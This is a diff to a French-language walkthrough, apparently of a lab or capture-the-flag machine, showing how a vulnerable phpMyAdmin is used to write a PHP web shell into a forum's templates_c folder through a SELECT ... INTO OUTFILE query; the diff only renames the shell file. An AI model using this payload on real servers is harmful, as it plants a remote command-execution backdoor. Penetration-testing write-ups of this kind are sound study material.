@@ -103,7 +103,7 @@ Après quelques recherches, cette version de phpMyAdmin est vulnérable à un [e
 
 - On va tester ces dossiers pour notre exploit depuis l'onglet SQL de phpMyAdmin:
   ```sql
-    SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><?php if ($_GET["cmd"]) {system($_GET["cmd"]);} ?>' into outfile '/var/www/forum/templates_c/wsa.php'
+    SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><?php if ($_GET["cmd"]) {system($_GET["cmd"]);} ?>' into outfile '/var/www/forum/templates_c/webshell.php'
   ```
   - Le premier a fonctionner est le dossier forum/templates_c, on obtient donc un moyen de lancer des commandes via PhPMyAdmin à l'adresse "https://192.168.56.#/forum/templates_c/webshell.php" grâce à la fonction [system](https://www.php.net/manual/en/function.system.php) de php!
 
